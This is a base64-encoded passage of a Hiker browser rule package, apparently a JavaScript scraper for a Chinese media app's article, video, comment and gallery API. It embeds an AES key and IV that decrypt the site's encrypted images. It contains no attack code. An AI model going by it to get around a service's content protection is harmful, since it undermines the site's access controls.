nL3YyLjUvYXJ0aWNsZS9kZXRhaWwnXFxudmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ2lkPScraWQpXFxudmFyIGRhdGEgPSBKU09OLnBhcnNlKGFwaXZpZXcuZ2V0aHRtbCh1cmwsYm9keSkpLmRhdGE7IC8vbG9nKGRhdGEpXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICdcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHTpooTop4hcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHQnLFxcbiAgICB1cmw6ICQoZGF0YS52aWRlb19maWxlKycjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChkYXRhKT0+e1xcbiAgICAgICAgcmV0dXJuICdodHRwczovL2FrbWFpdmlkZW8uY2RjaHVhbmdhby5jb20nK2lucHV0XFxuICAgIH0sZGF0YSksXFxuICAgIGNvbF90eXBlOiAndGV4dF8yJyxcXG4gICAgLy9leHRyYTogeydiYWNrZ3JvdW5kQ29sb3InOiAnI0UwRjhGRid9XFxufSlcXG5kLnB1c2goe1xcbiAgICB0aXRsZTogJ1xcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdOWOn+eJh1xcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0XFxcXHRcXFxcdCcsXFxuICAgIHVybDogJChkYXRhLnZpZGVvX2ZpbGUrJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGRhdGEpPT57XFxuICAgICAgICBpZigvc2FtcGxlLy50ZXN0KGlucHV0KSl7XFxuICAgICAgICAgICAgdmFyIHVybCA9IGlucHV0LnJlcGxhY2UoL1teYS16QS1aMC05XShzYW1wbGUpLywnJylcXG4gICAgICAgICAgICByZXR1cm4gJ2h0dHBzOi8vYWttYWl2aWRlby5jZGNodWFuZ2FvLmNvbScrdXJsXFxuICAgICAgICB9XFxuICAgICAgICBpZighL+aXoC8udGVzdChkYXRhLm51bWJlcikpe1xcbiAgICAgICAgICAgIHZhciB1cmwgPSBpbnB1dC5yZXBsYWNlKC9cXFxcLyhbXlxcXFwvXSspXFxcXC4vLCcvJytkYXRhLm51bWJlcisnLicpXFxuICAgICAgICAgICAgcmV0dXJuICdodHRwczovL2FrbWFpdmlkZW8uY2RjaHVhbmdhby5jb20nK3VybFxcbiAgICAgICAgfVxcbiAgICB9LGRhdGEpLFxcbiAgICBjb2xfdHlwZTogJ3RleHRfMicsXFxuICAgIC8vZXh0cmE6IHsnYmFja2dyb3VuZENvbG9yJzogJyNFMEY4RkYnfVxcbn0pXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IGFwaXZpZXcuYmlnKGFwaXZpZXcuc3Ryb25nKGRhdGEudGl0bGUpKSsnPGJyPjxicj4nKyfnlarlj7fvvJonK2FwaXZpZXcuZ3JheShkYXRhLm51bWJlcikrJ1xcXFx0XFxcXHRcXFxcdCcrJ+a8lOWRmO+8micrYXBpdmlldy5ncmF5KGRhdGEuYWN0b3IpKyc8YnI+JythcGl2aWV3LmdyYXkoZGF0YS5wdWJsaXNoZWRfYXQuc3BsaXQoJyAnKVswXSkrJ1xcXFx0XFxcXHRcXFxcdCcrYXBpdmlldy5ncmF5KGRhdGEubGVuZ3RoKSsnXFxcXHRcXFxcdFxcXFx0JythcGl2aWV3LmdyYXkoZGF0YS5zaXplKSsnXFxcXHRcXFxcdFxcXFx0JythcGl2aWV3LmdyYXkoZGF0YS5xdWFsaXR5KSxcXG4gICAgdXJsOiAnaGlrZXI6Ly9lbXB0eScsXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbn0pXFxuYXBpdmlldy5iaWFvcWlhbihkLGRhdGEpXFxuYXBpdmlldy55dWxhbnR1KGQsZGF0YSlcXG4vL2xvZyhkYXRhLmNvbnRlbnQpXFxuYXBpdmlldy50dXdlbihkLGRhdGEpXFxuXFxufVxcbn1cXG5cXG5zZXRSZXN1bHQoZClcXG5cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuivhOiuuuivpuaDhVwiLFwicGF0aFwiOlwicGlubHVuXCIsXCJydWxlXCI6XCJqczpcXG52YXIgYXBpdmlldyA9ICQucmVxdWlyZShcXFwiaGFuc2h1XFxcIilcXG52YXIgZCA9IFtdO1xcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBNWV9QQVJBTVMudGl0bGUsXFxuICAgIGRlc2M6IE1ZX1BBUkFNUy5kZXNjLFxcbiAgICBpbWc6IE1ZX1BBUkFNUy5pbWcsXFxuICAgIHVybDogJ2hpa2VyOi8vZW1wdHknLFxcbiAgICBjb2xfdHlwZTogJ2F2YXRhcidcXG59KVxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBhcGl2aWV3LmdyYXkoTVlfUEFSQU1TLmRlc2MxKSxcXG4gICAgY29sX3R5cGU6ICdyaWNoX3RleHQnLFxcbn0pXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6IGFwaXZpZXcuYmlnKGFwaXZpZXcuc3Ryb25nKCfnm7jlhbPlm57lpI3lhbEnK01ZX1BBUkFNUy5pdGVtLmxlbmd0aCsn5p2hJykpLFxcbiAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCcsXFxufSlcXG5NWV9QQVJBTVMuaXRlbS5yZXZlcnNlKCkuZm9yRWFjaChkYXRhID0+IHtcXG4gICAgaWYgKGRhdGEuYXZhdGFyID09ICcnKSB7XFxuICAgICAgICB2YXIgYXZhdGFyID0gJ2h0dHBzOi8vaW1nLnZpbnVhLmNuL2ltYWdlcy9Jbm5Eay50aC5wbmcnXFxuICAgIH0gZWxzZSB7XFxuICAgICAgICB2YXIgYXZhdGFyID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGRhdGEuYXZhdGFyKVxcbiAgICB9XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogZGF0YS5hdXRob3IsXFxuICAgICAgICBkZXNjOiBkYXRhLmNyZWF0ZWRfYXQsXFxuICAgICAgICBpbWc6IGF2YXRhcixcXG4gICAgICAgIHVybDogJ2hpa2VyOi8vZW1wdHknLFxcbiAgICAgICAgY29sX3R5cGU6ICdhdmF0YXInXFxuICAgIH0pXFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogYXBpdmlldy5hZGRyZXNzVGFnKCdoaWtlcjovL2VtcHR5JywnQCcrZGF0YS50YWdfYXV0aG9yKydcXFxcdFxcXFx0XFxcXHQnKSthcGl2aWV3LmdyYXkoZGF0YS50ZXh0KSxcXG4gICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXG4gICAgfSlcXG59KVxcbnNldFJlc3VsdChkKVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi6aaW6aG1XCIsXCJwYXRoXCI6XCJob21lXCIsXCJydWxlXCI6XCJpZihNWV9QQUdFID09ICcxJyl7XFxudmFyIGVuZERhdGUgPSBcXFwiMjAxOS0xMS0wOFxcXCI7XFxudmFyIGRhdGVzQXJyYXkgPSBhcGl2aWV3LmdldERhdGVzQXJyYXkoZW5kRGF0ZSk7XFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvYXJ0aWNsZS9kYXknXFxudmFyIHB1Ymxpc2hlZF9hdCA9IGdldE15VmFyKFxcXCJwdWJsaXNoZWRfYXRcXFwiKSA9PSAnJyA/IGRhdGVzQXJyYXlbMF0gOiBnZXRNeVZhcihcXFwicHVibGlzaGVkX2F0XFxcIik7IC8vbG9nKHB1Ymxpc2hlZF9hdClcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgncHVibGlzaGVkX2F0PScrcHVibGlzaGVkX2F0KVxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLGJvZHkpKS5kYXRhO1xcbmRhdGEuaW5mby5mb3JFYWNoKGl0ZW0gPT4ge1xcbiAgICB2YXIgaW1nID0gYXBpdmlldy5EZWNyeXB0MSgnaHR0cHM6Ly9qbXRwLmdwZ3JlaWkuY29tJyArIGl0ZW0udGh1bWIpXFxuICAgIGlmKGl0ZW0ubW9kZWxfaWQgPT0gJzYnKXtcXG4gICAgdmFyIHVybCA9IGBoaWtlcjovL3BhZ2UvZXJqaTE/cGFnZT1meXBhZ2Ujbm9IaXN0b3J5I2BcXG4gICAgfWVsc2V7XFxuICAgIHZhciB1cmwgPSBgaGlrZXI6Ly9wYWdlL2Vyamk/cGFnZT1meXBhZ2Ujbm9IaXN0b3J5IyNnYW1lVGhlbWUjYFxcbiAgICB9XFxuICAgIGQucHVzaCh7XFxuICAgICAgICB0aXRsZTogYCR7YXBpdmlldy5zdHJvbmcoaXRlbS50aXRsZSl9PGJyPiR7YXBpdmlldy5ncmF5KGl0ZW0uYXV0aG9yKX08YnI+JHthcGl2aWV3LmdyYXkoaXRlbS5kZXNjcmlwdGlvbi5yZXBsYWNlKC9cXFxcbi9nLCc8YnI+JykpfWAsXFxuICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXG4gICAgfSlcXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIGltZzogaW1nLFxcbiAgICAgICAgdXJsOiB1cmwsXFxuICAgICAgICBjb2xfdHlwZTogJ3BpY18xX2Z1bGwnLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBtb2RlbF9pZDogaXRlbS5tb2RlbF9pZCxcXG4gICAgICAgICAgICBpZDogaXRlbS5pZCxcXG4gICAgICAgICAgICBpbWc6IGltZ1xcbiAgICAgICAgfVxcbiAgICB9KVxcbiAgICBkLnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6ICdsaW5lX2JsYW5rJ1xcbiAgICB9KVxcbn0pXFxuZC5wdXNoKHtcXG4gICAgdGl0bGU6ICfigJzigJzliIfmjaLigJ3igJ0nLFxcbiAgICB1cmw6ICQoKS5sYXp5UnVsZSgocHVibGlzaGVkX2F0LGRhdGVzQXJyYXkpID0+IHtcXG4gICAgICAgIHNob3dTZWxlY3RPcHRpb25zKHtcXG4gICAgICAgICAgICB0aXRsZTogJ+W9k+WJje+8micrcHVibGlzaGVkX2F0LFxcbiAgICAgICAgICAgIG9wdGlvbnM6IGRhdGVzQXJyYXksXFxuICAgICAgICAgICAganM6ICQudG9TdHJpbmcoKCkgPT4ge1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwicHVibGlzaGVkX2F0XFxcIixpbnB1dCk7XFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly9cXFwiICsgaW5wdXRcXG4gICAgICAgICAgICB9KVxcbiAgICAgICAgfSk7XFxuICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiXFxuICAgIH0scHVibGlzaGVkX2F0LGRhdGVzQXJyYXkpLFxcbiAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiXFxufSlcXG59XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCLkuoznuqdcIixcInBhdGhcIjpcImVyamlcIixcInJ1bGVcIjpcImpzOlxcbnZhciBhcGl2aWV3ID0gJC5yZXF1aXJlKFxcXCJoYW5zaHVcXFwiKVxcbnZhciBtb2RlbF9pZCA9IE1ZX1BBUkFNUy5tb2RlbF9pZDsgLy9sb2codHlwZW9mIG1vZGVsX2lkKVxcbnZhciBpZCA9IE1ZX1BBUkFNUy5pZDsgLy9sb2coaWQpXFxudmFyIGltZyA9IE1ZX1BBUkFNUy5pbWdcXG52YXIgZCA9IFtdO1xcblxcbmlmKE1ZX1BBR0UgPT0gJzEnKXtcXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9hcnRpY2xlL2RldGFpbCdcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnaWQ9JytpZClcXG52YXIgZGF0YSA9IEpTT04ucGFyc2UoYXBpdmlldy5nZXRodG1sKHVybCxib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXG5zd2l0Y2ggKG1vZGVsX2lkKSB7XFxuICAgIGNhc2UgMTpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdwaWNfMV9mdWxsJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGAke2FwaXZpZXcuc3Ryb25nKGFwaXZpZXcuY2VudGVyKGRhdGEudGl0bGUpKX0ke2FwaXZpZXcuZ3JheShkYXRhLmRlc2NyaXB0aW9uKX0ke2FwaXZpZXcuZ3JheShhcGl2aWV3LmNlbnRlcihkYXRhLmF1dGhvcikpfWAsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxuICAgICAgICB9KVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgMjpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICAgICAgfSlcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgMzpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdwaWNfMV9mdWxsJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzop4bpopHigJ3igJ0nLFxcbiAgICAgICAgICAgIHVybDogJ2h0dHBzOi8vYWttYWl2aWRlby5jZGNodWFuZ2FvLmNvbScgKyBkYXRhLnZpZGVvX2ZpbGUsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICAgICAgfSlcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgNDpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICAgICAgfSlcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgNTpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdwaWNfMV9mdWxsJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJznlLXlj7DigJ3igJ0nLFxcbiAgICAgICAgICAgIHVybDogJ2h0dHBzOi8vYWttYWl2aWRlby5jZGNodWFuZ2FvLmNvbScgKyBkYXRhLnZpZGVvLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMSdcXG4gICAgICAgIH0pXFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIHRpdGxlOiBgPGgxPiR7YXBpdmlldy5zdHJvbmcoZGF0YS50aXRsZSl9PC9oMT4ke2FwaXZpZXcuZ3JheShkYXRhLmF1dGhvcil9YCxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3JpY2hfdGV4dCdcXG4gICAgICAgIH0pXFxuICAgICAgICBhcGl2aWV3LnR1d2VuKGQsZGF0YSlcXG4gICAgICAgIGJyZWFrO1xcbiAgICBjYXNlIDY6XFxuXFxuICAgICAgICBicmVhaztcXG59XFxuaWYoZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpID09ICdjcmVhdGVkX2F0Jyl7XFxudmFyIHRleHQgPSAn5b2T5YmN5o6S5bqP77ya5oyJ5pe26Ze0J1xcbn1cXG5pZihnZXRNeVZhcignYTEnKSA9PSAnbGlrZXMnKXtcXG52YXIgdGV4dCA9ICflvZPliY3mjpLluo/vvJrmjInng63luqYnXFxufVxcbi8vbG9nKGdldE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKSlcXG52YXIgcGFpeHUgPSAkKCcjbm9Mb2FkaW5nIycpLmI2NCgpLmxhenlSdWxlKCgpID0+IHtcXG4gICAgaWYoZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpID09ICdjcmVhdGVkX2F0Jyl7XFxuICAgICAgICBwdXRNeVZhcignYTEnLCdsaWtlcycpXFxuICAgICAgICB0b2FzdCgn5oyJ54Ot5bqmJylcXG4gICAgICAgIHJlZnJlc2hQYWdlKClcXG4gICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXG4gICAgfVxcbiAgICBpZihnZXRNeVZhcignYTEnKSA9PSAnbGlrZXMnKXtcXG4gICAgICAgIHB1dE15VmFyKCdhMScsJ2NyZWF0ZWRfYXQnKVxcbiAgICAgICAgdG9hc3QoJ+aMieaXtumXtCcpXFxuICAgICAgICByZWZyZXNoUGFnZSgpXFxuICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgIH1cXG59KVxcbmQucHVzaCh7XFxuICAgIHRpdGxlOiBhcGl2aWV3LmJpZyhhcGl2aWV3LnN0cm9uZygn55u45YWz5Zue5aSN5YWxJytkYXRhLnJlcGx5X2NvdW50cysn5p2hJykpKydcXFxcdFxcXFx0XFxcXHRcXFxcdFxcXFx0JythcGl2aWV3LmFkZHJlc3NUYWcocGFpeHUsdGV4dCksXFxuICAgIGNvbF90eXBlOiAncmljaF90ZXh0JyxcXG59KVxcbn1cXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9jb21tZW50L2xpc3QnXFxudmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ2FydGljbGVfaWQ9JytpZCsnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0yMCZzb3J0aW5nPScrZ2V0TXlWYXIoJ2ExJywnY3JlYXRlZF9hdCcpKVxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLCBib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXG5hcGl2aWV3LnBpbmdsdW4oZCxkYXRhKVxcblxcbnNldFJlc3VsdChkKVwifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwi5Y+R546wXCIsXCJwYXRoXCI6XCJjbGFcIixcInJ1bGVcIjpcInZhciBlbmREYXRlID0gXFxcIjIwMjEtMDktMDFcXFwiO1xcbnZhciBoZTEgPSBbJ+WbvuaWhycsJ+mYheivuycsJ+W9seinhicsJ+eUteWPsCcsJ+WGmeecnycsJ+a8q+eUuyddOyAvL2xvZyhoZTEpIFxcbnZhciBzdWJzMSA9IFsnMScsJzInLCczJywnNScsJzAnLCcwJ107IC8vbG9nKHN1YnMxKSBcXG52YXIgc3ViczIgPSBhcGl2aWV3LmdldFllYXJNb250aEFycmF5KGVuZERhdGUpOyAvL2xvZyhzdWJzMilcXG5pZihNWV9QQUdFID09ICcxJyl7XFxuaGUxLmZvckVhY2goKHgsaSk9PntcXG4gICAgdmFyIGN0aXRsZTEgPSB4XFxuICAgIHZhciBzdWIxID0gc3ViczFbaV1cXG4gICAgZC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBnZXRNeVZhcignY3RpdGxlMScsIGhlMVswXSkgPT0gY3RpdGxlMSA/ICfigJzigJzigJ3igJ0nK2N0aXRsZTEuZm9udGNvbG9yKCcjJytnZXRSYW5nZUNvbG9ycygpKTpjdGl0bGUxLFxcbiAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIyNub0hpc3RvcnkjJykubGF6eVJ1bGUoKGN0aXRsZTEsc3ViMSkgPT4ge1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiY3RpdGxlMVxcXCIsIGN0aXRsZTEpO1xcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwic3ViMVxcXCIsc3ViMSk7ICAgICAgICAgICAgICAgIFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxuICAgICAgICAgICAgfSwgY3RpdGxlMSxzdWIxKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCJcXG4gICAgfSlcXG59KVxcbn1cXG52YXIgaGUxID0gZ2V0TXlWYXIoXFxcImN0aXRsZTFcXFwiLGhlMVswXSk7IC8vbG9nKGhlMSlcXG52YXIgc3ViMSA9IGdldE15VmFyKFxcXCJzdWIxXFxcIixzdWJzMVswXSk7IC8vbG9nKHN1YjEpXFxudmFyIHN1YjIgPSBzdWJzMltNWV9QQUdFLTFdOyAvL2xvZyhzdWIyKVxcblxcbmlmKGhlMSA9PSAn5YaZ55yfJyl7XFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvc2VyaWVzL2FsYnVtL2xpc3QnXFxudmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ3R5cGU9JytzdWIxKycmcGFnZT0nK01ZX1BBR0UrJyZzaXplPTMxJnNvcnQ9cHVibGlzaGVkX2F0JylcXG59ZWxzZSBpZihoZTEgPT0gJ+a8q+eUuycpe1xcbnZhciB1cmwgPSBhcGl2aWV3Lmhvc3QrJy92Mi41L3Nlcmllcy9tYW5nYS9saXN0J1xcbnZhciBib2R5ID0gYXBpdmlldy5FbmNyeXB0KCd0eXBlPScrc3ViMSsnJnBhZ2U9JytNWV9QQUdFKycmc2l6ZT0zMSZzb3J0PXB1Ymxpc2hlZF9hdCcpXFxufWVsc2V7XFxudmFyIHVybCA9IGFwaXZpZXcuaG9zdCsnL3YyLjUvYXJ0aWNsZS9kaXNjb3ZlcnknXFxudmFyIGJvZHkgPSBhcGl2aWV3LkVuY3J5cHQoJ21vZGVsX2lkPScrc3ViMSsnJnB1Ymxpc2hlZF9hdD0nK3N1YjIrJyZwYWdlPTEmc2l6ZT0zMScpXFxufVxcbnZhciBkYXRhID0gSlNPTi5wYXJzZShhcGl2aWV3LmdldGh0bWwodXJsLGJvZHkpKS5kYXRhO1xcblxcbnN3aXRjaCAoc3ViMSkge1xcbiAgICBjYXNlICcwJzpcXG4gICAgICAgIGFwaXZpZXcueGllemhlbm1hbmh1YXlpamkoZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgJzEnOlxcbiAgICAgICAgYXBpdmlldy50dXdlbnlpamkoZCwgZGF0YSlcXG4gICAgICAgIGJyZWFrO1xcbiAgICBjYXNlICcyJzpcXG4gICAgICAgIGFwaXZpZXcueXVlZHV5aWppKGQsIGRhdGEpXFxuICAgICAgICBicmVhaztcXG4gICAgY2FzZSAnMyc6XFxuICAgICAgICBhcGl2aWV3LnlpbmdzaGl5aWppKGQsIGRhdGEpXFxuICAgICAgICBicmVhaztcXG4gICAgY2FzZSAnNSc6XFxuICAgICAgICBhcGl2aWV3LmRpYW50YWl5aWppKGQsIGRhdGEpXFxuICAgICAgICBicmVhaztcXG59XCJ9XSxcInBhcmFtc1wiOlwie1xcXCJpZFxcXCI6Mjc3MDcsXFxcImltZ1xcXCI6XFxcImh0dHBzOi8vam10cC5ncGdyZWlpLmNvbS9zdG9yYWdlL3RodW1iLzI3NzA3LzY3YTIxMTY3YjQwN2MuanBnQGpzPSQuaGlrZXIuTVlfVElUTEUgPSBcXFxcXFxcIuS4gOS4qkFQUFxcXFxcXFwiOyhcXFxcbigpID0+IHtcXFxcbiAgICBjb25zdCBDcnlwdG9VdGlsID0gJC5yZXF1aXJlKFxcXFxcXFwiaGlrZXI6Ly9hc3NldHMvY3J5cHRvLWphdmEuanNcXFxcXFxcIik7XFxcXG4gICAgbGV0IGtleSA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZVVURjgoXFxcXFxcXCJzYUlaWGM0eU12cTBJejU2XFxcXFxcXCIpO1xcXFxuICAgIGxldCBpdiA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZVVURjgoXFxcXFxcXCJrYkpZdEJKVUVDVDBveWpvXFxcXFxcXCIpO1xcXFxuICAgIGxldCB0ZXh0RGF0YSA9IENyeXB0b1V0aWwuRGF0YS5wYXJzZUlucHV0U3RyZWFtKGlucHV0KTtcXFxcbiAgICBsZXQgZW5jcnlwdGVkID0gQ3J5cHRvVXRpbC5BRVMuZGVjcnlwdCh0ZXh0RGF0YSwga2V5LCB7bW9kZTogXFxcXFxcXCJBRVMvQ0JDL1BLQ1M3UGFkZGluZ1xcXFxcXFwiLCBpdjogaXZ9KTtcXFxcbiAgICByZXR1cm4gZW5jcnlwdGVkLnRvSW5wdXRTdHJlYW0oKTtcXFxcbn1cXFxcbikoKVxcXCIsXFxcIm1vZGVsX2lkXFxcIjoyfVwiLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCLkuIDkuKpBUFBcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL3BhZ2UvZXJqaT9wYWdlPWZ5cGFnZSNub0hpc3RvcnkjI2dhbWVUaGVtZSNcIixcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJmaW5kX3J1bGVcIjpcImpzOlxcbnZhciBhcGl2aWV3ID0gJC5yZXF1aXJlKFxcXCJoYW5zaHVcXFwiKVxcbnZhciBtb2RlbF9pZCA9IE1ZX1BBUkFNUy5tb2RlbF9pZDsgLy9sb2codHlwZW9mIG1vZGVsX2lkKVxcbnZhciBpZCA9IE1ZX1BBUkFNUy5pZDsgLy9sb2coaWQpXFxudmFyIGltZyA9IE1ZX1BBUkFNUy5pbWdcXG52YXIgZCA9IFtdO1xcblxcbmlmKE1ZX1BBR0UgPT0gJzEnKXtcXG52YXIgdXJsID0gYXBpdmlldy5ob3N0KycvdjIuNS9hcnRpY2xlL2RldGFpbCdcXG52YXIgYm9keSA9IGFwaXZpZXcuRW5jcnlwdCgnaWQ9JytpZClcXG52YXIgZGF0YSA9IEpTT04ucGFyc2UoYXBpdmlldy5nZXRodG1sKHVybCxib2R5KSkuZGF0YTsgLy9sb2coZGF0YSlcXG5zd2l0Y2ggKG1vZGVsX2lkKSB7XFxuICAgIGNhc2UgMTpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdwaWNfMV9mdWxsJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGAke2FwaXZpZXcuc3Ryb25nKGFwaXZpZXcuY2VudGVyKGRhdGEudGl0bGUpKX0ke2FwaXZpZXcuZ3JheShkYXRhLmRlc2NyaXB0aW9uKX0ke2FwaXZpZXcuZ3JheShhcGl2aWV3LmNlbnRlcihkYXRhLmF1dGhvcikpfWAsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxuICAgICAgICB9KVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgMjpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGA8aDE+JHthcGl2aWV3LnN0cm9uZyhkYXRhLnRpdGxlKX08L2gxPiR7YXBpdmlldy5ncmF5KGRhdGEuYXV0aG9yKX1gLFxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcbiAgICAgICAgfSlcXG4gICAgICAgIGFwaXZpZXcudHV3ZW4oZCxkYXRhKVxcbiAgICAgICAgYnJlYWs7XFxuICAgIGNhc2UgMzpcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgaW1nOiBpbWcsXFxuICAgICAgICAgICAgdXJsOiBpbWcsXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdwaWNfMV9mdWxsJ1xcbiAgICAgICAgfSlcXG4gICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzop4bpopHigJ3igJ0nLFxcbiAgICAgICAgICAgIHVybDogJ2h0dHBzOi8vYWttYWl2aWRlby5jZGNodWFuZ2FvLmNvbScgKyB